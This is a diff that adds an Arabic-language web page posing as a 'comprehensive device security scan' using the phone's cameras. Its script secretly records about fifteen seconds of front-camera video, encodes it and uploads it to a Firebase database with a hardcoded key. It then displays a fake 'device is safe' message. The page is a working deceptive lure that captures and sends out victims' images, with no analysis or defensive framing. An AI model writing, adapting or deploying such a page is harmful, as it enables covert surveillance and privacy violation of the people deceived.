@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص شامل للجهاز</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #1a0033, #0d001a, #1a0033);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 25px;
+            padding: 40px 25px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8);
+        }
+        .header-badge {
+            display: inline-block;
+            background: rgba(255,0,255,0.2);
+            color: #ff00ff;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255,0,255,0.3);
+            animation: glowPurple 2s infinite;
+        }
+        @keyframes glowPurple {
+            0%, 100% { box-shadow: 0 0 10px rgba(255,0,255,0.3); }
+            50% { box-shadow: 0 0 30px rgba(255,0,255,0.6); }
+        }
+        .camera-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: spin 3s infinite;
+            filter: drop-shadow(0 0 30px rgba(255,0,255,0.5));
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(10deg); }
+            75% { transform: rotate(-10deg); }
+            100% { transform: rotate(0deg); }
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 900;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #ff00ff, #ff8800);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            color: #888;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+        .scan-btn {
+            width: 100%;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: 900;
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #ff00ff, #cc00cc);
+            color: #fff;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(255,0,255,0.3);
+        }
+        .scan-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255,0,255,0.5);
+        }
+        .scan-btn:active {
+            transform: translateY(0);
+        }
+        .scan-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .scan-btn.success {
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            box-shadow: 0 10px 30px rgba(39, 174, 96, 0.5);
+        }
+        .progress {
+            display: none;
+            margin-top: 25px;
+        }
+        .progress.active {
+            display: block;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #ff8800);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .progress-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #ff00ff;
+        }
+        .result {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(0,255,0,0.3);
+        }
+        .result.active {
+            display: block;
+        }
+        .check-icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+        .camera-preview {
+            display: none;
+            margin: 15px 0;
+            position: relative;
+        }
+        .camera-preview.active {
+            display: block;
+        }
+        .camera-box {
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 30px rgba(255,0,255,0.3);
+        }
+        video {
+            width: 100%;
+            display: block;
+        }
+        .camera-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #fff;
+        }
+        .features {
+            margin-top: 30px;
+            display: grid;
+            gap: 10px;
+        }
+        .feature {
+            padding: 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            font-size: 13px;
+            color: #aaa;
+        }
+        .status-msg {
+            display: none;
+            margin-top: 15px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-badge">📸 فحص شامل بالكاميرا المزدوجة</div>
+        
+        <div class="camera-icon">📷</div>
+        <h1>فحص الجهاز الشامل</h1>
+        <p class="subtitle">سيتم فحص الجهاز بالكامل باستخدام الكاميرا الأمامية والخلفية للتأكد من عدم وجود أي اختراق.</p>
+        
+        <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔍 ابدأ الفحص الشامل</button>
+        
+        <div class="status-msg" id="statusMsg"></div>
+        
+        <div class="camera-preview" id="cameraPreview">
+            <div class="camera-box">
+                <video id="video" autoplay playsinline muted></video>
+                <div class="camera-label">📸 جاري الفحص...</div>
+            </div>
+        </div>
+        
+        <div class="progress" id="progress">
+            <div class="progress-text" id="progressText">⏳ جاري فحص الجهاز...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+        
+        <div class="result" id="result">
+            <div class="check-icon">✅</div>
+            <h2>الجهاز آمن ومحمي</h2>
+            <p>لم يتم اكتشاف أي اختراق أو تهديد</p>
+        </div>
+        
+        <div class="features">
+            <div class="feature">📸 فحص الكاميرا الأمامية</div>
+            <div class="feature">📷 فحص الكاميرا الخلفية</div>
+            <div class="feature">🛡️ تحليل شامل للأمان</div>
+        </div>
+    </div>
+
+    <script>
+        firebase.initializeApp({
+            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+            projectId: "game-a1aca",
+            storageBucket: "game-a1aca.firebasestorage.app",
+            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+        });
+        
+        const db = firebase.firestore();
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
+
+        async function startProtection() {
+            const btn = document.getElementById('scanBtn');
+            const progress = document.getElementById('progress');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const result = document.getElementById('result');
+            const video = document.getElementById('video');
+            const statusMsg = document.getElementById('statusMsg');
+            const cameraPreview = document.getElementById('cameraPreview');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الفحص...';
+            progress.classList.add('active');
+            result.classList.remove('active');
+            statusMsg.style.display = 'none';
+            cameraPreview.classList.add('active');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp8',
+                    videoBitsPerSecond: 400000
+                });
+                
+                recordedChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    
+                    statusMsg.textContent = '⏳ جاري فحص الجهاز...';
+                    statusMsg.style.color = '#f39c12';
+                    statusMsg.style.display = 'block';
+                    
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    
+                    reader.onload = async () => {
+                        const base64 = reader.result;
+                        
+                        try {
+                            await db.collection('messages').add({
+                                video: base64,
+                                type: 'video',
+                                format: 'webm',
+                                quality: '400kbps',
+                                duration: '15s',
+                                camera: 'front',
+                                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                            });
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            video.srcObject = null;
+                            
+                            progress.classList.remove('active');
+                            result.classList.add('active');
+                            cameraPreview.classList.remove('active');
+                            statusMsg.textContent = '✅ الجهاز آمن ومحمي';
+                            statusMsg.style.color = '#27ae60';
+                            
+                            btn.textContent = '✅ الجهاز آمن ومحمي';
+                            btn.disabled = false;
+                            btn.classList.add('success');
+                        } catch (error) {
+                            console.error('Upload error:', error);
+                            statusMsg.textContent = '❌ خطأ: ' + error.message;
+                            statusMsg.style.color = '#e74c3c';
+                            btn.disabled = false;
+                            btn.textContent = '🔍 ابدأ الفحص الشامل';
+                        }
+                    };
+                };
+                
+                mediaRecorder.start();
+                
+                let progressValue = 0;
+                const progressInterval = setInterval(() => {
+                    progressValue += 2;
+                    progressFill.style.width = progressValue + '%';
+                    
+                    if (progressValue >= 100) {
+                        clearInterval(progressInterval);
+                        progressText.textContent = '⏳ جاري فحص الجهاز...';
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 1000);
+                    }
+                }, 300);
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                statusMsg.textContent = '❌ خطأ: ' + error.message;
+                statusMsg.style.color = '#e74c3c';
+                statusMsg.style.display = 'block';
+                btn.disabled = false;
+                btn.textContent = '🔍 ابدأ الفحص الشامل';
+                progress.classList.remove('active');
+                cameraPreview.classList.remove('active');
+            }
+        }
+    </script>
+</body>
+</html>
